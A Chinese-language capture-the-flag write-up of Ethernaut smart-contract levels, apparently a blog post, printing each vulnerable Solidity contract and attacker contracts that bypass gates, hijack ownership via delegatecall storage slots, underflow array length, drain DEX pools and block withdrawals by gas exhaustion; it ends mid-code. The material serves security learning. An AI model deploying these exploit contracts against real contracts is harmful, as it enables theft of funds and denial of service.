<p>最后看第二个条件<br>要求函数运行至此 gasleft正好为8191的整数倍<br>循环暴力跑出来<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;<br>    interface gate{<br>    function enter(bytes8 _gateKey) external;<br>    }<br>    contract Attack{<br>        address target;<br>        bytes8 key = 0x111111110000210c;<br>        bool public got;<br>        constructor(address _target) public {<br>            target = _target;<br>        }<br>        function attack() public {<br>            for(uint i = 0 ;i&lt;10000;i++){<br>                (bool success,) = target.call{gas: 30000+i}(abi.encodeWithSelector(gate.enter.selector,key));<br>                if(success){<br>                    got = true;<br>                    break;<br>                }<br>            }<br>        }<br>    }  </p>
<p>调用 attack 然后看got是否返回true<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="11.png" alt="11">  </p>
<h2 id="gatekeepertwo"><a href="#gatekeepertwo" class="headerlink" title="gatekeepertwo"></a>gatekeepertwo</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>contract GatekeeperTwo &#123;

    address public entrant;

    modifier gateOne() &#123;
        require(msg.sender != tx.origin);
        _;
    &#125;

    modifier gateTwo() &#123;
        uint x;
        assembly &#123; x := extcodesize(caller()) &#125;
        require(x == 0);
        _;
    &#125;

    modifier gateThree(bytes8 _gateKey) &#123;
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    &#125;

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;
        entrant = tx.origin;
        return true;
    &#125;
&#125;  
</code></pre><p>和上个题的目标一样  突破三道防线<br>防线1 要求通过合约调用<br>防线2 要求调用者地址代码长度为0  要通过这个验证 我们只需要在构造函数中完成调用 这样因为合约还未完成构造 检验出的代码长度就是0<br>防线3 要求调用地址和key经异或运算符合一个等式<br>异或的一个性质<br>a ^ b = c  则 a ^ c = b<br>那么我们已知 a c 要求b  那么只需要计算 a^c就可以</p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface gate&#123;
    function enter(bytes8 _gateKey) external;
&#125;

contract attack&#123;
    constructor(address target) public &#123;
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        gate(target).enter(bytes8(key));
    &#125;
&#125;
</code></pre><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="12.png" alt="12">  </p>
<h2 id="NaughtCoin"><a href="#NaughtCoin" class="headerlink" title="NaughtCoin"></a>NaughtCoin</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>import &#39;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#39;;

contract NaughtCoin is ERC20 &#123;

    // string public constant name = &#39;NaughtCoin&#39;;
    // string public constant symbol = &#39;0x0&#39;;
    // uint public constant decimals = 18;
    uint public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) 
    ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) &#123;
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    &#125;

    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;
        super.transfer(_to, _value);
    &#125;

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() &#123;
        if (msg.sender == player) &#123;
        require(block.timestamp &gt; timeLock);
        _;
        &#125; else &#123;
        _;
        &#125;
    &#125; 
&#125; 
</code></pre><p>题目是个erc20标准代币  它重写了transfer函数 对转账做出了限制<br>要求十年以后才能转账<br>但是erc20还有一个转账函数transferFrom<br>题目未对他进行限制<br>只需在转账前对自己进行授权  然后把钱转出就行<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="13.png" alt="13">  </p>
<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>contract Preservation &#123;

    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;
        timeZone1Library = _timeZone1LibraryAddress; 
        timeZone2Library = _timeZone2LibraryAddress; 
        owner = msg.sender;
    &#125;

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public &#123;
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    &#125;

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public &#123;
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    &#125;
&#125;

// Simple library contract to set the time
contract LibraryContract &#123;

    // stores a timestamp 
    uint storedTime;  

    function setTime(uint _time) public &#123;
        storedTime = _time;
    &#125;
&#125;
</code></pre><p>这题还考delegatecall  调用delegatecall时运行目标合约的逻辑，但是改变的是自己的环境<br>题目要求我们成为owner<br>可以看到调用LibraryContract的setTime改变的是插槽0的数值<br>在preservation合约中插槽0储存的是timeZone1Library的地址 我们可以把它更改为自己的攻击合约地址<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>contract attack&#123;
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function setTime(uint _time) public &#123;
        owner = address(0x34B91dA4A48DdE39d19A0DEecF3616aba752210C);
    &#125;
&#125;
</code></pre><p>然后再调用我们的攻击合约 owner就被夺取了  </p>
<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>contract Recovery &#123;

    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public &#123;
        new SimpleToken(_name, msg.sender, _initialSupply);

    &#125;
&#125;

contract SimpleToken &#123;

    string public name;
    mapping (address =&gt; uint) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;
        name = _name;
        balances[_creator] = _initialSupply;
    &#125;

    // collect ether in return for tokens
    receive() external payable &#123;
        balances[msg.sender] = msg.value * 10;
    &#125;

    // allow transfers of tokens
    function transfer(address _to, uint _amount) public &#123; 
        require(balances[msg.sender] &gt;= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    &#125;

    // clean up after ourselves
    function destroy(address payable _to) public &#123;
        selfdestruct(_to);
    &#125;
&#125;
</code></pre><p>代码中可以得知调用generateToken可以new一个SimpleToken 但是他们失去了SimpleToken的地址 要我们找到这个地址<br>题目本意是让我们了解creat1方法<br>keccak256(address, nonce)<br> 但是可以通过查询Recovery链上合约交易信息直接找到SimpleToken的地址<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="15.1.png" alt="15.1"></p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface simple&#123;
    function destroy(address payable _to) external;
&#125;
contract attack&#123;
    address target;
    constructor(address _target)public &#123;
        target = _target;
    &#125;

    function Attack(address payable add) public&#123;
        simple(target).destroy(add);
    &#125;

&#125;
</code></pre><p>传入simpleToken地址再调用Attack<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="15.2.png" alt="15.2">  </p>
<h2 id="AlienCodex"><a href="#AlienCodex" class="headerlink" title="AlienCodex"></a>AlienCodex</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.5.0;</p>
<pre><code>import &#39;../helpers/Ownable-05.sol&#39;;

contract AlienCodex is Ownable &#123;

    bool public contact;
    bytes32[] public codex;

    modifier contacted() &#123;
        assert(contact);
        _;
    &#125;

    function make_contact() public &#123;
        contact = true;
    &#125;

    function record(bytes32 _content) contacted public &#123;
        codex.push(_content);
    &#125;

    function retract() contacted public &#123;
        codex.length--;
    &#125;

    function revise(uint i, bytes32 _content) contacted public &#123;
        codex[i] = _content;
    &#125;
&#125;  
</code></pre><p>这题还考储存<br>插槽0 是owner和contract打包储存<br>可以看到合约提供了修改数组数据的函数  codex数组是变长数组 先占据了插槽1储存数组长度<br>开始长度为0<br>那么如果调用retract（） 就会发生下溢 数组的长度变得很大  可以覆盖所有插槽<br>我们就可以通过改变数组的值改变owner（储存在插槽0）<br>我们先算出变长数组第一个元素的储存位置  其余元素顺序储存<br>keccak256（1）<br>然后用uint256的max减去算出的值再加1 就是owner在数组的元素位置<br>  bytes32 public data = keccak256(abi.encode(1));<br>  uint256 public b  = type(uint256).max-uint256(data);<br>  （算出来的b要加1）</p>
<p>算出来为35707666377435648211887908874984608119992236509074197713628505308453184860938<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="16.1.png" alt="16.1"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="16.3.png" alt="16.3"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="16.2.png" alt="16.2"><br>owner已经变为我们自己了  </p>
<h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;<br>    contract Denial {</p>
<pre><code>        address public partner; // withdrawal partner - pay the gas, split the withdraw
        address public constant owner = address(0xA9E);
        uint timeLastWithdrawn;
        mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances

        function setWithdrawPartner(address _partner) public &#123;
            partner = _partner;
        &#125;

        // withdraw 1% to recipient and 1% to owner
        function withdraw() public &#123;
            uint amountToSend = address(this).balance / 100;
            // perform a call without checking return
            // The recipient can revert, the owner will still get their share
            partner.call&#123;value:amountToSend&#125;(&quot;&quot;);
            payable(owner).transfer(amountToSend);
            // keep track of last withdrawal time
            timeLastWithdrawn = block.timestamp;
            withdrawPartnerBalances[partner] +=  amountToSend;
        &#125;

        // allow deposit of funds
        receive() external payable &#123;&#125;

        // convenience function
        function contractBalance() public view returns (uint) &#123;
            return address(this).balance;
        &#125;
&#125;
</code></pre><p>要求我们组止 owner withdraw（）<br>看到withdraw是会给partner转钱  触发partner的receive函数<br>我们可以在receive函数中耗尽交易gas  这样交易就会失败<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;<br>    contract Denial {<br>    receive() external payable{<br>        uint amount = gasleft();<br>        for(int i = 0;i&lt;10000000000000000000000000000;i++){<br>            address(0).call{gas: amount}(“”);<br>        }<br>    }<br>    }<br>把这个合约的地址设为partner就可以成功  </p>
<h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>interface Buyer &#123;
function price() external view returns (uint);
&#125;

contract Shop &#123;
    uint public price = 100;
    bool public isSold;

    function buy() public &#123;
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;
        isSold = true;
        price = _buyer.price();
        &#125;
    &#125;
&#125;  
</code></pre><p>要求最后成交的price小于100<br>这要求price（）返回不同的值  price（）是view函数 不能改变内部合约的数据 那也就不能计数  但是可以通过读取外部合约数据的变化来返回不同的值<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>interface Buyer &#123;
function price() external view returns (uint);
&#125;

contract Shop &#123;
uint public price = 100;
bool public isSold;

function buy() public &#123;
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;
    isSold = true;
    price = _buyer.price();
    &#125;
&#125;
&#125;
contract attack &#123;
    Shop target;
    constructor(address _target) public&#123;
        target = Shop(_target);
    &#125;
    function Attack() public&#123;
        target.buy();
    &#125;
    function price() external view returns (uint)&#123;
        if(target.isSold())&#123;
            return 0;
        &#125;
        return 101;
    &#125;
&#125;
//当isSold不是true 返回101 如果是true 返回0  
</code></pre><p>调用attack<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="17.png" alt="17">  </p>
<h2 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;
import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;
import &#39;openzeppelin-contracts-08/access/Ownable.sol&#39;;

contract Dex is Ownable &#123;
    address public token1;
    address public token2;
    constructor() &#123;&#125;

    function setTokens(address _token1, address _token2) public onlyOwner &#123;
        token1 = _token1;
        token2 = _token2;
    &#125;

    function addLiquidity(address token_address, uint amount) public onlyOwner &#123;
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    &#125;

    function swap(address from, address to, uint amount) public &#123;
        require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);
        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);
        uint swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    &#125;

    function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;
        return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
    &#125;

    function approve(address spender, uint amount) public &#123;
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    &#125;

    function balanceOf(address token, address account) public view returns (uint)&#123;
        return IERC20(token).balanceOf(account);
    &#125;
&#125;

contract SwappableToken is ERC20 &#123;
    address private _dex;
    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;
            _mint(msg.sender, initialSupply);
            _dex = dexInstance;
    &#125;

    function approve(address owner, address spender, uint256 amount) public &#123;
        require(owner != _dex, &quot;InvalidApprover&quot;);
        super._approve(owner, spender, amount);
    &#125;
&#125;  
</code></pre><p>题目提供了一个代币交易所  可以允许我们对token1和token2进行交换<br>合约有token0和token1各100个 我们的任务是从两个代币各十个开始 换光里边的任意一个代币<br>经过简单的计算可以发现  swap函数的代币价格计算方法有点问题 没有手续费的情况下只要进行交换  那么我们两个代币总余额就会变多<br>所以只要一直进行交换操作 就可以让一个余额为0<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="18.1.png" alt="18.1"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="18.2.png" alt="18.2"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="18.3.png" alt="18.3"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="18.4.png" alt="18.4">  </p>
<h2 id="dex2"><a href="#dex2" class="headerlink" title="dex2"></a>dex2</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;
import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;
import &#39;openzeppelin-contracts-08/access/Ownable.sol&#39;;

contract DexTwo is Ownable &#123;
    address public token1;
    address public token2;
    constructor() &#123;&#125;

    function setTokens(address _token1, address _token2) public onlyOwner &#123;
        token1 = _token1;
        token2 = _token2;
    &#125;

    function add_liquidity(address token_address, uint amount) public onlyOwner &#123;
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    &#125;

    function swap(address from, address to, uint amount) public &#123;
        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);
        uint swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    &#125; 

    function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;
        return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
    &#125;

    function approve(address spender, uint amount) public &#123;
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    &#125;

    function balanceOf(address token, address account) public view returns (uint)&#123;
        return IERC20(token).balanceOf(account);
    &#125;
    &#125;

    contract SwappableTokenTwo is ERC20 &#123;
    address private _dex;
    constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;
            _mint(msg.sender, initialSupply);
            _dex = dexInstance;
    &#125;

    function approve(address owner, address spender, uint256 amount) public &#123;
        require(owner != _dex, &quot;InvalidApprover&quot;);
        super._approve(owner, spender, amount);
    &#125;
&#125;  
</code></pre><p>题目要求我们把合约内的两个token1 token2都转走<br>题目里的漏洞在哪里？  那就是swap函数没有规定from和to必须是token1和token2中的一个<br>那么我们可以自己部署一个代币 为我们自己铸造很多余额 用它和池中的token1和token2进行交换  </p>
<pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;;
import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&quot;;


contract SwappableTokenTwo is ERC20 &#123;
    address private _dex;
    constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;
            _mint(msg.sender, initialSupply);
            _dex = dexInstance;
    &#125;

    function approve(address owner, address spender, uint256 amount) public &#123;
        require(owner != _dex, &quot;InvalidApprover&quot;);
        super._approve(owner, spender, amount);
    &#125;
&#125;  
</code></pre><p>构造的时候最少铸造400个<br>然后给目标合约授权<br>然后进行交换<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="19.1.png" alt="19.1"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="19.2.png" alt="19.2">  </p>
<h2 id="Motorbike"><a href="#Motorbike" class="headerlink" title="Motorbike"></a>Motorbike</h2><p>代码<br>    // SPDX-License-Identifier: MIT</p>
<pre><code>pragma solidity &lt;0.7.0;

import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;
import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;

contract Motorbike &#123;
    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot &#123;
        address value;
    &#125;

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public &#123;
        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature(&quot;initialize()&quot;)
        );
        require(success, &quot;Call failed&quot;);
    &#125;

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual &#123;
        // solhint-disable-next-line no-inline-assembly
        assembly &#123;
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 &#123; revert(0, returndatasize()) &#125;
            default &#123; return(0, returndatasize()) &#125;
        &#125;
    &#125;

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual &#123;
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    &#125;

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;
        assembly &#123;
            r_slot := slot
        &#125;
    &#125;
&#125;

contract Engine is Initializable &#123;
    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot &#123;
        address value;
    &#125;

    function initialize() external initializer &#123;
        horsePower = 1000;
        upgrader = msg.sender;
    &#125;

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    &#125;

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view &#123;
        require(msg.sender == upgrader, &quot;Can&#39;t upgrade&quot;);
    &#125;

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal &#123;
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length &gt; 0) &#123;
            (bool success,) = newImplementation.delegatecall(data);
            require(success, &quot;Call failed&quot;);
        &#125;
    &#125;

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private &#123;
        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);

        AddressSlot storage r;
        assembly &#123;
            r_slot := _IMPLEMENTATION_SLOT
        &#125;
        r.value = newImplementation;
    &#125;
&#125;  
</code></pre><p>题目让我们自毁发动机合约<br>我们通过插槽找到逻辑合约（Engine）的地址<br>然后查插槽0和1 发现都是空<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="20.png" alt="20"><br>这是因为代理合约 在调用时用的<br>(bool success,) = _logic.delegatecall(<br>                abi.encodeWithSignature(“initialize()”)<br>            );<br>所以不会影响逻辑合约的插槽 那么相当于engine还未初始化 我们可以初始化成为upgrader<br>然后就可以调用 upgradeToAndCall（） 可以看到call的时候也是delegatecall<br>(bool success,) = newImplementation.delegatecall(data);<br>那么就可以在newImplementation中设置一个自毁函数 那么调用时自毁的就是engine  </p>
<h2 id="DoubleEntryPoint"><a href="#DoubleEntryPoint" class="headerlink" title="DoubleEntryPoint"></a>DoubleEntryPoint</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p>
<pre><code>import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;
import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;

interface DelegateERC20 &#123;
function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
&#125;

interface IDetectionBot &#123;
    function handleTransaction(address user, bytes calldata msgData) external;
&#125;

interface IForta &#123;
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
&#125;

contract Forta is IForta &#123;
mapping(address =&gt; IDetectionBot) public usersDetectionBots;
mapping(address =&gt; uint256) public botRaisedAlerts;

function setDetectionBot(address detectionBotAddress) external override &#123;
    usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
&#125;

function notify(address user, bytes calldata msgData) external override &#123;
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) &#123;
        return;
    &#125; catch &#123;&#125;
&#125;

function raiseAlert(address user) external override &#123;
    if(address(usersDetectionBots[user]) != msg.sender) return;
    botRaisedAlerts[msg.sender] += 1;
&#125; 
&#125;

contract CryptoVault &#123;
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) &#123;
        sweptTokensRecipient = recipient;
    &#125;

    function setUnderlying(address latestToken) public &#123;
        require(address(underlying) == address(0), &quot;Already set&quot;);
        underlying = IERC20(latestToken);
    &#125;

    /*
    ...
    */

    function sweepToken(IERC20 token) public &#123;
        require(token != underlying, &quot;Can&#39;t transfer underlying token&quot;);
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    &#125;
&#125;

contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123;
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner &#123;
        _mint(to, amount);
    &#125;

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123;
        delegate = newContract;
    &#125;

    function transfer(address to, uint256 value) public override returns (bool) &#123;
        if (address(delegate) == address(0)) &#123;
            return super.transfer(to, value);
        &#125; else &#123;
            return delegate.delegateTransfer(to, value, msg.sender);
        &#125;
    &#125;
&#125;

contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123;
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123;
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = playerAddress;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    &#125;

    modifier onlyDelegateFrom() &#123;
        require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;);
        _;
    &#125;

    modifier fortaNotify() &#123;
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);
    &#125;

    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;
        _transfer(origSender, to, value);
        return true;
    &#125;
&#125;
</code></pre><p>底层代币是det 不能被调走  但是如果sweepToken中传入的是LGT  那么他有个自己的transfer  如果delegate不为0那么就会转delegatetoken（det）  相当于把底层代币转走了<br>我们要检验交易  只需要检验origSender是不是cryptoVault就可以了<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;<br>    interface forta{<br>        function raiseAlert(address user) external;</p>
<pre><code>&#125;
contract bot &#123;
    address leToken;
    forta target;
    mapping(address =&gt; uint256) public botRaisedAlerts;
    constructor(address token,address _forta) public&#123;
        leToken = token;
        target = forta(_forta);
    &#125; 

    function handleTransaction(address user, bytes calldata msgData) external&#123;
        (bytes4 a,address to,uint value,address sender) = abi.decode(msgData,(bytes4,address,uint,address));
        if(sender == leToken)&#123;
            target.raiseAlert(address(0x34B91dA4A48DdE39d19A0DEecF3616aba752210C));
        &#125;
    &#125;
&#125;
</code></pre><p>token和forta输cryptoVault和forta地址<br>然后为自己setDetectionBot就可以完成了  </p>
<h2 id="GoodSamaritan"><a href="#GoodSamaritan" class="headerlink" title="GoodSamaritan"></a>GoodSamaritan</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity &gt;=0.8.0 &lt;0.9.0;</p>
<pre><code>import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;;

contract GoodSamaritan &#123;
    Wallet public wallet;
    Coin public coin;

    constructor() &#123;
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    &#125;

    function requestDonation() external returns(bool enoughBalance)&#123;
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) &#123;
            return true;
        &#125; catch (bytes memory err) &#123;
            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123;
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            &#125;
        &#125;
    &#125;
&#125;

contract Coin &#123;
    using Address for address;

    mapping(address =&gt; uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) &#123;
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    &#125;

    function transfer(address dest_, uint256 amount_) external &#123;
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ &lt;= currentBalance) &#123;
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) &#123;
                // notify contract 
                INotifyable(dest_).notify(amount_);
            &#125;
        &#125; else &#123;
            revert InsufficientBalance(currentBalance, amount_);
        &#125;
    &#125;
&#125;

contract Wallet &#123;
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() &#123;
        if(msg.sender != owner) &#123;
            revert OnlyOwner();
